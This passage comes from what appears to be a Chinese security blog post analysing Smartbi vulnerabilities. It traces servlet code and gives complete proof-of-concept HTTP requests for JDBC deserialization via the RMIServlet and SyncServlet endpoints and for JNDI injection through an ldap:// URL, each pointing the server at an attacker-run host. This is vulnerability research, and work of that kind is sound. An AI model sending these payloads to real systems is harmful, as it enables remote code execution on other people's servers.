class="hljs-string">&quot;STATIC&quot;</span>&#125;]<br>-&gt;url编码<br>className=DataSourceService&amp;methodName=testConnection&amp;params=[&#123;<span class="hljs-string">&quot;password&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;maxConnection&quot;</span><span class="hljs-variable">%3a100</span>,<span class="hljs-string">&quot;user&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;driverType&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;MYSQL&quot;</span>,<span class="hljs-string">&quot;validationQuery&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;SELECT+1+FROM+DUAL&quot;</span>,<span class="hljs-string">&quot;url&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;jdbc%3amysql<span class="hljs-variable">%3a</span>//[本机IP]<span class="hljs-variable">%3a3308</span>/d4c5846%3fautoDeserialize%3dtrue<span class="hljs-variable">%2</span>6statementInterceptors<span class="hljs-variable">%3dcom</span>.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,<span class="hljs-string">&quot;name&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;JDBC&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>,<span class="hljs-string">&quot;id&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;desc&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;alias&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;dbCharset&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;identifierQuoteString&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;transactionIsolation&quot;</span><span class="hljs-variable">%3a</span>-<span class="hljs-number">1</span>,<span class="hljs-string">&quot;validationQueryMethod&quot;</span><span class="hljs-variable">%3a0</span>,<span class="hljs-string">&quot;dbToCharset&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;authenticationType&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;STATIC&quot;</span>&#125;]<br><br><br><br><br>POST /smartbi/vision/RMIServlet HTTP/<span class="hljs-number">1.1</span><br>Host: localhost:<span class="hljs-number">18080</span><br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">113.0</span><span class="hljs-number">.5672</span><span class="hljs-number">.127</span> Safari/<span class="hljs-number">537.36</span><br>Accept: *<span class="hljs-regexp">/*</span><br><span class="hljs-regexp">Origin: http:/</span><span class="hljs-regexp">/localhost</span><br><span class="hljs-regexp">Referer: http:/</span><span class="hljs-regexp">/localhost:18080/smar</span>tbi/vision/index.jsp<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;<span class="hljs-keyword">q</span>=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br>Cookie: JSESSIONID=0BBBD2EC4AE481FB607FC501FA04897E<br>Content-Type: application/<span class="hljs-keyword">x</span>-www-form-urlencoded;charset=UTF-<span class="hljs-number">8</span><br>Connection : keep-alive<br>Content-Length: <span class="hljs-number">580</span><br><br>className=DataSourceService&amp;methodName=testConnection&amp;params=[&#123;<span class="hljs-string">&quot;password&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;maxConnection&quot;</span><span class="hljs-variable">%3a100</span>,<span class="hljs-string">&quot;user&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;driverType&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;MYSQL&quot;</span>,<span class="hljs-string">&quot;validationQuery&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;SELECT+1+FROM+DUAL&quot;</span>,<span class="hljs-string">&quot;url&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;jdbc%3amysql<span class="hljs-variable">%3a</span>//192.168.1.25<span class="hljs-variable">%3a3308</span>/d4c5846%3fautoDeserialize%3dtrue<span class="hljs-variable">%2</span>6statementInterceptors<span class="hljs-variable">%3dcom</span>.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,<span class="hljs-string">&quot;name&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;JDBC&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>,<span class="hljs-string">&quot;id&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;desc&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;alias&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;dbCharset&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;identifierQuoteString&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;transactionIsolation&quot;</span><span class="hljs-variable">%3a</span>-<span class="hljs-number">1</span>,<span class="hljs-string">&quot;validationQueryMethod&quot;</span><span class="hljs-variable">%3a0</span>,<span class="hljs-string">&quot;dbToCharset&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;authenticationType&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;STATIC&quot;</span>&#125;]<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071702241.png" srcset="/img/loading.gif" lazyload alt="20250806162931145"></p>
+<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><ol>
+<li>根据依赖版本确定存在漏洞</li>
+<li>根据依赖的敏感函数找入口点</li>
+</ol>
+<h2 id="前台JDBC反序列化"><a href="#前台JDBC反序列化" class="headerlink" title="前台JDBC反序列化"></a>前台JDBC反序列化</h2><h3 id="漏洞分析：-1"><a href="#漏洞分析：-1" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\sync\SyncServlet.class</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SyncServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    ...<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">ServletOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> response.getOutputStream();<br>        <span class="hljs-type">File</span> <span class="hljs-variable">tmpFile</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">actionType</span> <span class="hljs-operator">=</span> StringUtil.getLanguageValue(<span class="hljs-string">&quot;Synchronization&quot;</span>);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (!ServletFileUpload.isMultipartContent(request)) &#123;<br>                request.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">type</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;type&quot;</span>);<br>                response.setBufferSize(<span class="hljs-number">4096</span>);<br>                <span class="hljs-keyword">if</span> (type.equals(<span class="hljs-string">&quot;sqldictsync&quot;</span>)) &#123;<br>                    <span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>                    <span class="hljs-comment">//从请求中提取数据库连接配置和查询语句</span><br>                    <span class="hljs-type">String</span> <span class="hljs-variable">dbType</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbType&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">dbServer</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbServer&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">dbName</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbName&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">dbUser</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbUser&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">dbPass</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbPass&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">querySql</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;querySql&quot;</span>);<br>                    <span class="hljs-type">boolean</span> <span class="hljs-variable">dbNameOnly</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;true&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;dbNameOnly&quot;</span>));<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">clientId</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>                    log.debug(<span class="hljs-string">&quot;sqldictsync[dbName:&quot;</span> + dbName + <span class="hljs-string">&quot;,dbNameOnly:&quot;</span> + dbNameOnly + <span class="hljs-string">&quot;,querySql:&quot;</span> + querySql + <span class="hljs-string">&quot;]&quot;</span>);<br>                    <span class="hljs-keyword">if</span> (dbNameOnly) &#123;<br>                        clientId = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SyncResources</span>()).synchronize(dbName, querySql);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        clientId = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SyncResources</span>()).synchronize(dbType, dbServer, dbName, dbUser, dbPass, querySql);<br>                    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>跟进 synchronize</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SyncResources</span> &#123;<br>    ...<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">synchronize</span><span class="hljs-params">(String dbType, String dbServer, String dbName, String dbUser, String dbPass, String querySql)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//调用 DbUtil.getConnection() 获取数据库连接</span><br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> DbUtil.getConnection(dbType, dbServer, dbName, dbUser, dbPass, (String)<span class="hljs-literal">null</span>);<br>        <span class="hljs-keyword">if</span> (conn == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(StringUtil.getLanguageValue(<span class="hljs-string">&quot;Incomingconnectionparametererrorestablishconnectionfailed&quot;</span>));<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">colsCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">8</span>;<br>            <span class="hljs-type">Reader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultSetReader</span>(conn, querySql, colsCount);<br>            <span class="hljs-type">DictTree</span> <span class="hljs-variable">tree</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DictTree</span>(reader);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.doSynchronize(tree);<br>        &#125;<br>    &#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>跟进 DbUtil.getConnection</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DbUtil</span> &#123;<br>    ...<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">(String dbType, String dbServer, String dbName, String dbUser, String dbPass, String connName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">DBType</span> <span class="hljs-variable">driverType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//将传入的 dbType 字符串转为大写并在 DBType 中查找；如果输入非法，抛出异常并返回 null</span><br>            driverType = DBType.valueOf(dbType.toUpperCase());<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var9) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-comment">//translateDriverInfo() 方法：根据数据库类型、服务器地址、数据库名,生成数据库连接配置，如：&quot;jdbc:db2://&quot; + serverName + &quot;/&quot; + dbName</span><br>        String[] drvInfo = translateDriverInfo(driverType, dbServer, dbName);<br>        <span class="hljs-keyword">if</span> (drvInfo == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">//创建 DefaultConnectionInfo 实例，用于表示连接信息</span><br>            <span class="hljs-type">DefaultConnectionInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultConnectionInfo</span>();<br>            info.setId(UUIDGenerator.generate());<br>            info.setName(connName);<br>            info.setDriverType(driverType);<br>            info.setDriver(drvInfo[<span class="hljs-number">0</span>]);<br>            info.setUrl(drvInfo[<span class="hljs-number">1</span>]);<br>            info.setUser(dbUser);<br>            info.setPassword(dbPass);<br>            <span class="hljs-comment">//获取数据库连接</span><br>            <span class="hljs-keyword">return</span> ConnectionPool.getInstance().getConnection(info);<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String[] translateDriverInfo(DBType dbType, String serverName, String dbName, String dbEncoding) &#123;<br>        String[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">2</span>];<br>        <span class="hljs-keyword">switch</span> (dbType) &#123;<br>            <span class="hljs-keyword">case</span> DB2:<br>            <span class="hljs-keyword">case</span> DB2_400:<br>                result[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;COM.ibm.db2.jdbc.net.DB2Driver&quot;</span>;<br>                result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:db2://&quot;</span> + serverName + <span class="hljs-string">&quot;/&quot;</span> + dbName;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> DB2_V9:<br>                result[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;com.ibm.db2.jcc.DB2Driver&quot;</span>;<br>                <span class="hljs-keyword">if</span> (serverName.indexOf(<span class="hljs-string">&quot;:&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>                    result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:db2://&quot;</span> + serverName + <span class="hljs-string">&quot;:50000/&quot;</span> + dbName + <span class="hljs-string">&quot;:deferPrepares=false;&quot;</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:db2://&quot;</span> + serverName + <span class="hljs-string">&quot;/&quot;</span> + dbName + <span class="hljs-string">&quot;:deferPrepares=false;&quot;</span>;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> INFORMIX:<br>                result[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;com.informix.jdbc.IfxDriver&quot;</span>;<br>                result[<span class="hljs-number">1</span>] = serverName;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> MYSQL:<br>            <span class="hljs-keyword">case</span> INFOBRIGHT:<br>                result[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>;<br>                <span class="hljs-keyword">if</span> (dbEncoding == <span class="hljs-literal">null</span>) &#123;<br>                    dbEncoding = <span class="hljs-string">&quot;GBK&quot;</span>;<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;mysqlCluster=true&quot;</span>.equals(dbType.getProp())) &#123;<br>                    result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:mysql:loadbalance://&quot;</span> + serverName + <span class="hljs-string">&quot;/&quot;</span> + dbName;<br>                    <span class="hljs-keyword">if</span> (dbName.indexOf(<span class="hljs-string">&quot;?&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>                        result[<span class="hljs-number">1</span>] = result[<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;?useServerPrepStmts=true&amp;autoReconnect=true&amp;roundRobinLoadBalance=true&amp;failOverReadOnly=false&amp;characterEncoding=&quot;</span> + dbEncoding;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:mysql://&quot;</span> + serverName + <span class="hljs-string">&quot;/&quot;</span> + dbName;<br>                    <span class="hljs-keyword">if</span> (dbName.indexOf(<span class="hljs-string">&quot;?&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>                        result[<span class="hljs-number">1</span>] = result[<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;?useServerPrepStmts=true&amp;useOldAliasMetadataBehavior=true&amp;useUnicode=true&amp;characterEncoding=&quot;</span> + dbEncoding;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> MSSQL:<br>                ......<br></code></pre></td></tr></table></figure>
+
+<p>漏洞点产生在 <code>translateDriverInfo</code> ，此处可以拼接恶意数据库</p>
+<h3 id="漏洞复现：-1"><a href="#漏洞复现：-1" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>构造POC：</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-attr">type</span><span class="hljs-operator">=</span>sqldictsync<span class="hljs-variable">&amp;</span>dbNameO<span class="hljs-attr">nly</span><span class="hljs-operator">=</span>false<span class="hljs-variable">&amp;</span>dbT<span class="hljs-attr">ype</span><span class="hljs-operator">=</span>MYSQL<span class="hljs-variable">&amp;</span>dbS<span class="hljs-attr">erver</span><span class="hljs-operator">=</span>[本机IP]:<span class="hljs-number">3308</span><span class="hljs-variable">&amp;</span>dbN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>d5a442d?detectCustomC<span class="hljs-attr">ollations</span><span class="hljs-operator">=</span>true<span class="hljs-variable">&amp;</span>autoD<span class="hljs-attr">eserialize</span><span class="hljs-operator">=</span>yes<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /smartbi/vision/SyncServlet HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: localhost:<span class="hljs-number">18080</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">113</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5672</span>.<span class="hljs-number">127</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded;<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">138</span><br><br><span class="hljs-attribute">type</span>=sqldictsync&amp;dbNameOnly=false&amp;dbType=MYSQL&amp;dbServer=[本机IP]:<span class="hljs-number">3308</span>&amp;dbName=d5a442d?detectCustomCollations=true%<span class="hljs-number">26</span>autoDeserialize=yes<br></code></pre></td></tr></table></figure>
+
+<p>同样的，开启3308端口，搭建FakeMysql服务器，生成K1链</p>
+<p>成功利用：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071702529.png" srcset="/img/loading.gif" lazyload alt="20250806181941863"></p>
+<h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><h3 id="漏洞分析：-2"><a href="#漏洞分析：-2" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071702526.png" srcset="/img/loading.gif" lazyload alt="20250806192734078"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-comment">//如果数据库连接url是以JDNI开头</span><br><span class="hljs-keyword">if</span> (info.getUrl().startsWith(<span class="hljs-string">&quot;JNDI:&quot;</span>)) &#123;<br>    <span class="hljs-type">InitialContext</span> <span class="hljs-variable">cxt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>    <span class="hljs-comment">//去掉 JNDI 部分，保留后边部分，然后用 cxt.lookup 查找并返回 DataSource</span><br>    <span class="hljs-type">DataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> (DataSource)cxt.lookup(info.getUrl().substring(<span class="hljs-string">&quot;JNDI:&quot;</span>.length()));<br>    <span class="hljs-keyword">return</span> dataSource.getConnection();<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h3 id="漏洞复现：-2"><a href="#漏洞复现：-2" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>POC：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /smartbi/vision/RMIServlet HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: localhost:<span class="hljs-number">18080</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">113</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5672</span>.<span class="hljs-number">127</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded;charset=UTF-<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>: */*<br><span class="hljs-attribute">Origin</span>: http://<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">127.0.0.1:18080</span>/smartbi/vision/index.jsp<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Cookie</span>: JSESSIONID=<span class="hljs-number">5</span>E67682266D39E9F1475ADA74B62E102<br><span class="hljs-attribute">Connection</span> : keep-alive<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">466</span><br><br><span class="hljs-attribute">className</span>=DataSourceService&amp;methodName=testConnection&amp;params=[&#123;<span class="hljs-string">&quot;password&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;maxConnection&quot;</span>%<span class="hljs-number">3</span>a100,<span class="hljs-string">&quot;user&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;driverType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;MYSQL&quot;</span>,<span class="hljs-string">&quot;validationQuery&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;SELECT+1+FROM+DUAL&quot;</span>,<span class="hljs-string">&quot;url&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JNDI:ldap://[ip]:15089/bb4e07&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JDBC&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>,<span class="hljs-string">&quot;id&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;desc&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;alias&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;dbCharset&quot;</span>%<span class="hljs-number">3</span>a<span 